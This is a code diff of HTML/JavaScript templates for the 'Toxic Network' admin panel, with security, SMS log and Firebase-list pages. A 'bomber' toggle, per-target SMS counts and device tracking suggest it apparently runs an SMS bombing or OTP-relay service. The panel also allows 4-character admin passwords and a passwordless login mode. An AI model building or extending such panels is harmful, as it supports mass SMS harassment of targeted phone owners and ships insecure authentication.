+        <a href="/supermasteradmin/firebases" style="padding:8px 12px;background:#334155;color:#f1f5f9;border-radius:8px;font-size:12px;font-weight:600;text-decoration:none">⚙️ Manage</a>
+      </div>'''
 )
-
 
 # ==================== SECURITY HTML ====================
 SECURITY_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Security — Alex Admin</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Security</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#f59e0b">
-<style>""" + MOBILE_CSS + r"""
-body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
-.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
-.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
-@media(min-width:640px){.nav{order:0;width:auto}}
-.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
-.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-.nav-link.security{background:#fef3c7;color:#92400e}
-.nav-link.security.active{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
-.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
-.container{max-width:600px;margin:0 auto;padding:14px}
-.card{background:#fff;border-radius:14px;padding:20px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.card h3{font-size:15px;color:#334155;margin-bottom:6px;font-weight:700;display:flex;align-items:center;gap:8px}
-.card p.desc{font-size:12px;color:#94a3b8;margin-bottom:16px}
-.field{margin-bottom:14px}
-.field label{display:block;font-size:12px;color:#64748b;font-weight:600;margin-bottom:6px}
-.pwd-wrap{position:relative}
-.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;transition:.2s}
-.pwd-wrap input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#94a3b8;padding:4px}
-.btn{padding:14px 20px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;width:100%;min-height:50px}
-.btn.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-.btn.warning{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
-.btn:active{transform:scale(.97)}
-.msg{margin-top:12px;padding:12px 14px;border-radius:10px;font-size:13px;display:none;text-align:center}
-.msg.ok{background:#dcfce7;color:#166534;display:block}
-.msg.err{background:#fee2e2;color:#991b1b;display:block}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
-.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="alex">Alex</span> SECURITY<span class="admin-badge">👑</span></div>
-<a href="/logout" class="logout-btn">Logout</a>
-<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link security active">🔒 Security</a></div>
+<div class="brand">🔒 Toxic<span>Security</span></div>
+<a href="/logout" style="padding:10px 16px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:13px;font-weight:600;text-decoration:none">Logout</a>
+</div>
+
+<div class="nav">
+  <a href="/supermasteradmin/dashboard" class="nav-link">📱 Numbers</a>
+  <a href="/supermasteradmin/firebases" class="nav-link">🔥 Firebases</a>
+  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS Logs</a>
+  <a href="/supermasteradmin/security" class="nav-link active">🔒 Security</a>
 </div>
 
 <div class="container">
-<div class="card">
-<h3>👤 Change User Password</h3>
-<p class="desc">Ye password user panel login ke liye. MongoDB me permanent save hoga.</p>
-<div class="field">
-<label>New User Password</label>
-<div class="pwd-wrap">
-<input type="password" id="user-pwd" placeholder="Enter new user password">
-<span class="toggle-pwd" onclick="togglePwd('user-pwd', event)">👁️</span>
-</div>
-</div>
-<button class="btn primary" onclick="changeUserPwd()">Update User Password</button>
-<div class="msg" id="user-msg"></div>
+<div class="sec-card">
+<h3>⚡ User Panel Control</h3>
+<p class="desc">Manage panel status and access modes.</p>
+<div id="panel-status-display" class="status-display active">
+<div class="status-icon">🟢</div>
+<div><div class="status-label">Panel Status</div><div class="status-value" id="panel-status-val">ACTIVE · UNLIMITED</div></div>
 </div>
 
-<div class="card">
+<div style="font-size:11px;font-weight:700;color:#94a3b8;margin-bottom:8px">QUICK TOGGLE</div>
+<div class="btn-row">
+<button class="btn green" onclick="panelActivate(0)">🟢 Activate (∞)</button>
+<button class="btn warning" onclick="panelDeactivate()">🔴 Deactivate</button>
+</div>
+
+<div style="font-size:11px;font-weight:700;color:#94a3b8;margin-bottom:8px">TEMPORARY ACTIVATION</div>
+<div class="timer-row">
+<button onclick="panelActivate(15)">15m</button>
+<button onclick="panelActivate(60)">1h</button>
+<button onclick="panelActivate(360)">6h</button>
+<button onclick="panelActivate(1440)">24h</button>
+</div>
+<div class="custom-timer" style="display:flex;gap:8px;margin-bottom:20px">
+<input type="number" id="custom-min" placeholder="Custom mins" min="1" style="flex:1;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:10px;color:#f1f5f9">
+<button onclick="panelActivate(parseInt(document.getElementById('custom-min').value)||0)" style="padding:12px 20px;background:#3b82f6;color:#fff;border-radius:10px;font-weight:700">Set</button>
+</div>
+
+<div style="font-size:11px;font-weight:700;color:#94a3b8;margin-bottom:8px">PASSWORDLESS MODE</div>
+<div class="btn-row">
+<button class="btn green" onclick="setPasswordless(true)">🔓 Enable (∞)</button>
+<button class="btn warning" onclick="setPasswordless(false)">🔒 Disable</button>
+</div>
+<div class="timer-row">
+<button onclick="setPasswordless(true, 15)">15m</button>
+<button onclick="setPasswordless(true, 60)">1h</button>
+<button onclick="setPasswordless(true, 360)">6h</button>
+<button onclick="setPasswordless(true, 1440)">24h</button>
+</div>
+<div class="msg" id="panel-msg"></div>
+</div>
+
+<div class="sec-card">
+<h3>💣 SMS Sender Control</h3>
+<p class="desc">Toggle the SMS Sender feature. When disabled, users cannot send any SMS (single or bulk).</p>
+<div class="btn-row">
+<button class="btn green" onclick="toggleBomber(true)">🟢 Enable</button>
+<button class="btn warning" onclick="toggleBomber(false)">🔴 Disable</button>
+</div>
+<div class="msg" id="bomber-msg"></div>
+</div>
+
+<div class="sec-card">
 <h3>👑 Change Admin Password</h3>
-<p class="desc">Ye password admin panel login ke liye. MongoDB me permanent save hoga.</p>
+<p class="desc">Update your root access key.</p>
 <div class="field">
-<label>New Admin Password</label>
-<div class="pwd-wrap">
-<input type="password" id="admin-pwd" placeholder="Enter new admin password">
-<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁️</span>
+<label>New Root Password</label>
+<div class="pwd-wrap-sec">
+<input type="password" id="admin-pwd" placeholder="Enter new password">
+<span class="toggle-pwd-sec" onclick="toggleSecPwd()">👁</span>
 </div>
 </div>
-<button class="btn warning" onclick="changeAdminPwd()">Update Admin Password</button>
+<button class="btn btn-primary" style="width:100%;margin-top:16px;background:#3b82f6" onclick="changeAdminPwd()">Update Password</button>
 <div class="msg" id="admin-msg"></div>
 </div>
 </div>
@@ -2194,421 +1656,370 @@ body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
 
 <script>
 function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
-function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁️'; } }
+function toggleSecPwd(){ const i = document.getElementById('admin-pwd'); const t = event.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁'; } }
 function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }
-async function changeUserPwd(){
-  const pwd = document.getElementById('user-pwd').value.trim();
-  if(!pwd || pwd.length < 4){ showMsg('user-msg', '❌ Min 4 chars', 'err'); return; }
-  const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'user', password: pwd}) });
-  const d = await r.json();
-  if(d.success){ showMsg('user-msg', '✅ User password saved!', 'ok'); document.getElementById('user-pwd').value = ''; toast('✅ Changed'); }
-  else { showMsg('user-msg', '❌ ' + (d.error || 'Error'), 'err'); }
+
+function formatRemaining(secs){
+  if(secs <= 0) return 'EXPIRED';
+  const h = Math.floor(secs/3600);
+  const m = Math.floor((secs%3600)/60);
+  const s = secs%60;
+  if(h > 0) return `${h}h ${m}m`;
+  if(m > 0) return `${m}m ${s}s`;
+  return `${s}s`;
 }
+
+async function loadPanelStatus(){
+  try{
+    const r = await fetch('/api/panel/status');
+    const d = await r.json();
+    if(!d.success) return;
+    const display = document.getElementById('panel-status-display');
+    const val = document.getElementById('panel-status-val');
+    const now = Math.floor(Date.now()/1000);
+    if(!d.active){
+      display.className = 'status-display inactive';
+      display.querySelector('.status-icon').textContent = '🔴';
+      val.textContent = 'DEACTIVATED';
+    } else if(d.passwordless){
+      display.className = 'status-display pwdless';
+      display.querySelector('.status-icon').textContent = '🔓';
+      val.textContent = 'PASSWORDLESS · ACTIVE';
+    } else if(d.expires_at > 0){
+      const rem = Math.max(0, d.expires_at - now);
+      display.className = 'status-display temp';
+      display.querySelector('.status-icon').textContent = '⏱';
+      val.textContent = 'TEMP · ' + formatRemaining(rem);
+    } else {
+      display.className = 'status-display active';
+      display.querySelector('.status-icon').textContent = '🟢';
+      val.textContent = 'ACTIVE · UNLIMITED';
+    }
+  }catch(e){}
+}
+
+async function panelActivate(minutes){
+  try{
+    const r = await fetch('/api/panel/activate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({minutes: minutes}) });
+    const d = await r.json();
+    if(d.success){ showMsg('panel-msg', '✅ PANEL UPDATED', 'ok'); toast('✅ SAVED'); loadPanelStatus(); }
+    else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
+}
+
+async function panelDeactivate(){
+  if(!confirm('Deactivate user panel? All users will be blocked immediately.')) return;
+  try{
+    const r = await fetch('/api/panel/deactivate', { method: 'POST', headers: {'Content-Type': 'application/json'} });
+    const d = await r.json();
+    if(d.success){ showMsg('panel-msg', '✅ PANEL DEACTIVATED — Users blocked', 'ok'); toast('🔴 DEACTIVATED'); loadPanelStatus(); }
+    else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
+}
+
+async function setPasswordless(enabled, minutes){
+  try{
+    const r = await fetch('/api/panel/passwordless', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({enabled: enabled, minutes: minutes || 0}) });
+    const d = await r.json();
+    if(d.success){ showMsg('panel-msg', '✅ SETTINGS SAVED', 'ok'); toast('✅ SAVED'); loadPanelStatus(); }
+    else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
+}
+
+async function toggleBomber(enabled){
+  try{
+    const r = await fetch('/api/panel/bomber', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({enabled}) });
+    const d = await r.json();
+    if(d.success){ showMsg('bomber-msg', `✅ SMS SENDER ${enabled ? 'ENABLED' : 'DISABLED'}`, 'ok'); toast('✅ SAVED'); }
+    else { showMsg('bomber-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  }catch(e){ showMsg('bomber-msg', '❌ NETWORK ERROR', 'err'); }
+}
+
 async function changeAdminPwd(){
   const pwd = document.getElementById('admin-pwd').value.trim();
-  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ Min 4 chars', 'err'); return; }
+  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ MIN 4 CHARS', 'err'); return; }
   const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'admin', password: pwd}) });
   const d = await r.json();
-  if(d.success){ showMsg('admin-msg', '✅ Admin password saved!', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ Changed'); }
-  else { showMsg('admin-msg', '❌ ' + (d.error || 'Error'), 'err'); }
+  if(d.success){ showMsg('admin-msg', '✅ PASSWORD SAVED', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ CHANGED'); }
+  else { showMsg('admin-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
 }
+
+loadPanelStatus();
+setInterval(loadPanelStatus, 3000);
 </script>
 </body>
 </html>
 """
 
-
-# ==================== FIREBASES HTML ====================
-# ✅ Per-firebase online/offline count
-FIREBASES_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Firebases — Alex OTP</title>
+# ==================== SMS LOGS HTML ====================
+SMS_LOGS_HTML = r"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — SMS Logs</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#7c3aed">
-<style>""" + MOBILE_CSS + r"""
-body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
-.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
-.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
-@media(min-width:640px){.nav{order:0;width:auto}}
-.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
-.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-.nav-link.security{background:#fef3c7;color:#92400e}
-.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
-.conn.online{color:#16a34a;background:#dcfce7}
-.conn.offline{color:#dc2626;background:#fee2e2}
-.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
-.container{max-width:900px;margin:0 auto;padding:14px}
-.card{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.card h3{font-size:13px;color:#334155;margin-bottom:12px;font-weight:700;display:flex;align-items:center;gap:8px}
-.add-row{display:flex;gap:8px;flex-wrap:wrap}
-.add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;font-family:monospace}
-.add-row input:focus{border-color:#8b5cf6;background:#fff}
-button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;min-height:50px}
-button.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-button.gray{background:#f1f5f9;color:#475569}
-button.danger{background:#fef2f2;color:#dc2626}
-button.danger-solid{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff}
-button.green{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
-button:active{transform:scale(.97)}
-.bulk-area{margin-top:10px;display:none}
-.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
-.bulk-area textarea:focus{border-color:#8b5cf6;background:#fff}
-.bulk-area button{margin-top:8px}
-.msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
-.msg.ok{background:#dcfce7;color:#166534;display:block}
-.msg.err{background:#fee2e2;color:#991b1b;display:block}
-.fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px}
-.fb-header h2{font-size:14px;font-weight:800;color:#334155;display:flex;align-items:center;gap:8px}
-.fb-header .actions{display:flex;gap:6px;flex-wrap:wrap}
-.fb-header .actions button{padding:10px 12px;font-size:12px;min-height:44px}
-.fb-list{display:grid;gap:10px}
-.fb-card{background:#fff;border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);border:2px solid transparent;flex-wrap:wrap}
-.fb-card:active{transform:scale(.98)}
-.fb-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#fef3c7,#fde68a);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
-.fb-info{flex:1;min-width:0;cursor:pointer}
-.fb-name{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
-.fb-hash{font-size:11px;color:#94a3b8;margin-top:2px;font-family:monospace;word-break:break-all}
-/* ✅ Online/Offline count pills */
-.fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
-.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:3px 8px;border-radius:8px}
-.fb-count-pill.online{background:#dcfce7;color:#166534}
-.fb-count-pill.offline{background:#fee2e2;color:#991b1b}
-.fb-count-pill.devices{background:#e0e7ff;color:#3730a3}
-.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
-.fb-actions{display:flex;gap:6px;flex-shrink:0}
-.fb-actions button{padding:10px 12px;font-size:12px;min-height:44px}
-.checkbox{width:24px;height:24px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:.2s;background:#fff;color:#fff;font-size:14px;font-weight:800}
-.checkbox.checked{background:linear-gradient(135deg,#7c3aed,#a855f7);border-color:#7c3aed}
-.select-all{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#f8fafc;border-radius:12px;margin-bottom:12px;font-size:13px;font-weight:600;color:#475569;cursor:pointer}
-.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
-.confirm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(15,23,42,.6);display:none;align-items:center;justify-content:center;z-index:200;padding:20px}
-.confirm-overlay.show{display:flex}
-.confirm-box{background:#fff;border-radius:16px;padding:24px;max-width:400px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
-.confirm-box h3{font-size:18px;color:#1e293b;margin-bottom:8px}
-.confirm-box p{font-size:13px;color:#64748b;margin-bottom:20px}
-.confirm-box .btns{display:flex;gap:10px}
-.confirm-box button{flex:1}
-.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
-.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="alex">Alex</span> FIREBASES<span class="admin-badge">👑</span></div>
-<div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link security">🔒 Security</a></div>
+<div class="brand">📜 Toxic<span>Logs</span></div>
+<a href="/logout" style="padding:10px 16px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:13px;font-weight:600;text-decoration:none">Logout</a>
+</div>
+
+<div class="nav">
+  <a href="/supermasteradmin/dashboard" class="nav-link">📱 Numbers</a>
+  <a href="/supermasteradmin/firebases" class="nav-link">🔥 Firebases</a>
+  <a href="/supermasteradmin/smslogs" class="nav-link active">📜 SMS Logs</a>
+  <a href="/supermasteradmin/security" class="nav-link">🔒 Security</a>
 </div>
 
 <div class="container">
-<div class="card">
-<h3>➕ Add Firebase URL</h3>
+<div id="logs-container"><div class="empty"><span class="spinner-dark"></span> Loading logs...</div></div>
+</div>
+
+<script>
+async function loadLogs(){
+  try{
+    const r = await fetch('/api/sms/logs');
+    const d = await r.json();
+    const box = document.getElementById('logs-container');
+    if(!d.success){ box.innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
+    const logs = d.logs || [];
+    if(logs.length === 0){ box.innerHTML = '<div class="empty">📭 No SMS logs found</div>'; return; }
+    box.innerHTML = logs.map(l => {
+      const time = new Date(l.timestamp * 1000).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
+      const ip = l.ip || 'N/A';
+      return `
+        <div class="log-card">
+          <div class="log-head">
+            <div class="log-target">📞 ${escapeHtml(l.target)}</div>
+            <div class="log-time">${time}</div>
+          </div>
+          <div class="log-msg">${escapeHtml(l.message)}</div>
+          <div class="log-meta">
+            <span>👤 Device: ${escapeHtml(l.device_id)}</span>
+            <span>🔢 Count: ${l.count}x</span>
+            <span>🌐 IP: ${escapeHtml(ip)}</span>
+          </div>
+        </div>`;
+    }).join('');
+  }catch(e){ document.getElementById('logs-container').innerHTML = '<div class="empty">❌ NETWORK ERROR</div>'; }
+}
+function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
+loadLogs();
+setInterval(loadLogs, 10000);
+</script>
+</body></html>
+"""
+
+# ==================== FIREBASES HTML ====================
+FIREBASES_HTML = r"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebases</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+</style></head><body>
+
+<div class="topbar">
+<div class="brand">🔥 Toxic<span>Firebases</span></div>
+<a href="/logout" style="padding:10px 16px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:13px;font-weight:600;text-decoration:none">Logout</a>
+</div>
+
+<div class="nav">
+  <a href="/supermasteradmin/dashboard" class="nav-link">📱 Numbers</a>
+  <a href="/supermasteradmin/firebases" class="nav-link active">🔥 Firebases</a>
+  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS Logs</a>
+  <a href="/supermasteradmin/security" class="nav-link">🔒 Security</a>
+</div>
+
+<div class="container">
+<div class="fb-card-list">
+<h3 style="font-size:16px;font-weight:700;margin-bottom:16px">➕ Add Firebase URL</h3>
 <div class="add-row">
 <input id="fb-url" placeholder="https://xxx.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" onclick="addFirebase()">Add</button>
-<button class="gray" onclick="toggleBulk()">Bulk</button>
+<button class="btn primary" onclick="addFirebase()">Add</button>
+<button class="btn gray" onclick="toggleBulk()">Bulk</button>
 </div>
-<div id="bulk-area" class="bulk-area">
-<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button class="green" onclick="bulkAdd()">📥 Import All</button>
+<div id="bulk-area" style="margin-top:12px;display:none">
+<textarea id="fb-bulk" placeholder="Paste multiple URLs here (one per line)" style="width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;min-height:120px;resize:vertical;margin-bottom:10px"></textarea>
+<button class="btn primary" style="width:100%" onclick="bulkAdd()">📥 Import All</button>
 </div>
-<div id="fb-msg" class="msg"></div>
+<div id="fb-msg" class="msg" style="display:none;margin-top:12px;padding:12px;border-radius:10px;font-size:13px;text-align:center"></div>
 </div>
 
-<div class="card">
 <div class="fb-header">
-<h2>🔥 All Firebases <span style="background:#f1f5f9;color:#475569;padding:3px 10px;border-radius:20px;font-size:11px" id="fb-count">0</span></h2>
-<div class="actions">
-<button class="danger" onclick="removeSelected()">🗑 Sel</button>
-<button class="danger-solid" onclick="removeAll()">🗑 All</button>
-</div>
-</div>
-<div class="select-all" onclick="toggleSelectAll()"><div class="checkbox" id="select-all-cb"></div><span>Select All</span></div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span>Loading...</div>
-<div id="fb-list" class="fb-list"></div>
+<h2>All Firebases <span class="count" id="fb-count" style="font-size:12px;background:rgba(245,158,11,.1);color:#f59e0b;padding:4px 10px;border-radius:20px">0</span></h2>
+<div style="display:flex;gap:8px">
+<button class="btn gray" onclick="removeSelected()" style="padding:8px 12px;font-size:12px">🗑 Sel</button>
+<button class="btn gray" onclick="removeAll()" style="padding:8px 12px;font-size:12px;color:#ef4444">🗑 All</button>
 </div>
 </div>
 
-<div class="confirm-overlay" id="confirm-overlay">
-<div class="confirm-box">
-<h3 id="confirm-title">Are you sure?</h3>
-<h3 id="confirm-desc">This action cannot be undone.</h3>
-<div class="btns"><button class="gray" onclick="closeConfirm()">Cancel</button><button class="danger-solid" id="confirm-btn">Delete</button></div>
-</div>
+<div id="fb-list"></div>
 </div>
 
+<!-- Bug fix #3: toast element added -->
 <div id="toast" class="toast"></div>
 
 <script>
 let firebases = [];
 let selected = new Set();
 
-function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2200); }
-async function checkConn(){
-  try{
-    const r = await fetch('/api/conn'); const d = await r.json();
-    const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
-    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
-  }catch(e){}
+function toast(text){ 
+  const t = document.getElementById('toast'); 
+  if(!t) { console.log('Toast:', text); return; }
+  t.textContent = text; t.classList.add('show'); 
+  setTimeout(()=>t.classList.remove('show'), 2200); 
 }
 function toggleBulk(){ const a = document.getElementById('bulk-area'); a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
+function showMsg(text, type){
+  const el = document.getElementById('fb-msg');
+  el.style.display = 'block';
+  el.style.background = type === 'ok' ? 'rgba(16,185,129,.1)' : 'rgba(239,68,68,.1)';
+  el.style.color = type === 'ok' ? '#10b981' : '#ef4444';
+  el.textContent = text;
+  setTimeout(()=>el.style.display='none', 3000);
+}
+
 async function addFirebase(){
   const url = document.getElementById('fb-url').value.trim();
-  if(!url) return showMsg('fb-msg','URL required','err');
+  if(!url) return showMsg('URL required', 'err');
   const r = await fetch('/api/firebases',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
   const d = await r.json();
-  if(d.success){ showMsg('fb-msg','✅ Added (URL hidden)','ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
-  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
+  if(d.success){ showMsg('✅ Added successfully', 'ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
+  else showMsg('❌ '+(d.error||'ERROR'), 'err');
 }
+
 async function bulkAdd(){
   const txt = document.getElementById('fb-bulk').value.trim();
-  if(!txt) return showMsg('fb-msg','Empty','err');
+  if(!txt) return showMsg('Empty textarea', 'err');
   const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
-  if(!urls.length) return showMsg('fb-msg','No valid URLs','err');
-  showMsg('fb-msg',`⏳ Adding ${urls.length}...`,'ok');
+  if(!urls.length) return showMsg('No valid URLs found', 'err');
+  showMsg(`⏳ Adding ${urls.length} firebases...`, 'ok');
